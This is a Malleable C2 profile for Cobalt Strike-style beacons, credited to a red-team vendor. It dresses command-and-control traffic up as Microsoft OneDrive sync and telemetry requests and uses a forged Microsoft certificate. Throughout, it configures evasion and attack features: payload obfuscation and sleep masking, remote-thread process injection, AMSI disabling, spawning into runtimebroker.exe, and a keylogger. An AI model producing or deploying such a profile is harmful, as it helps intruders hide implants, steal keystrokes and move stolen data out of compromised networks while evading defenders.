# =====================================================================
# Profile: Microsoft 365 & OneDrive Sync - STEALTH
# Generated & Validated by Ostad Red Team Forge Malleable C2 Engine
# Founder & Director: Ostad Rezaul Karim (Top 1% Red Teamer)
# =====================================================================

set sample_name "update_ba5UIx.exe";
set sleeptime "5000";
set jitter "25";
set maxget "1048576";
set data_jitter "14";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36";
set pipename "samr_##";
set pipename_stager "status_oc4F##";


http-get {
    set uri "/_api/v2.1/drives/syncFeed" "/v1.0/drive/root/delta";

    client {
        header "Host" "api.onedrive.live.com";
        header "Accept" "application/json;odata.metadata=minimal";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Sec-Ch-Ua-Mobile" "?0";
        header "Sec-Ch-Ua-Platform" ""Windows"";
        header "client-request-id" "b40d6c70-9d57-41fb-9921-2e650d0322bf";
        metadata {
            mask;
            base64url;
            prepend "token=";
            header "Cookie";
        }
    }

    server {
        header "Server" "Microsoft-IIS/10.0";
        header "Content-Type" "application/json";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/v2.0/telemetry/heartbeat" "/personal/sync/v3/batchCommit";
    set verb "POST";

    client {
        header "Host" "api.onedrive.live.com";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Sec-Ch-Ua-Mobile" "?0";
        header "Sec-Ch-Ua-Platform" ""Windows"";
        header "client-request-id" "b40d6c70-9d57-41fb-9921-2e650d0322bf";
        header "Content-Type" "application/json";
        id {
            mask;
            base64url;
            parameter "sync_id";
        }
        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Server" "Microsoft-IIS/10.0";
        header "Content-Type" "application/json";
        output {
            mask;
            base64;
            print;
        }
    }
}

stage {
    set checksum "0";
    set cleanup "true";
    set sleep_mask "true";
    set smartinject "true";
    set stomppe "true";
    set obfuscate "true";
    set userwx "false";
    set magic_mz_x86 "MZSB";
    set magic_mz_x64 "MZSB";
    set magic_pe "PL";
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";
    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\syswow64\runtimebroker.exe";
    set spawnto_x64 "%windir%\sysnative\runtimebroker.exe";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}

https-certificate {
    set CN "onedrive.live.com";
    set O "Microsoft Corporation";
    set OU "Microsoft 365 Core";
    set C "US";
    set ST "WA";
    set L "Redmond";
    set validity "694";
}
